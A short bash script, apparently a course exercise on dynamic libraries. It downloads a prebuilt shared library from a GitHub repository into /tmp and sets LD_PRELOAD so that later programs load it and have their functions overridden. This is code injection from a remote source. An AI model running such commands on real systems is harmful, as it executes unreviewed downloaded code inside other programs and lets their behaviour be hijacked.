#!/bin/bash
wget -P /tmp https://github.com/gwaez/alx-low_level_programming/raw/master/0x18-dynamic_libraries/lib-giga-G.so
export LD_PRELOAD=/tmp/lib-giga-G.so

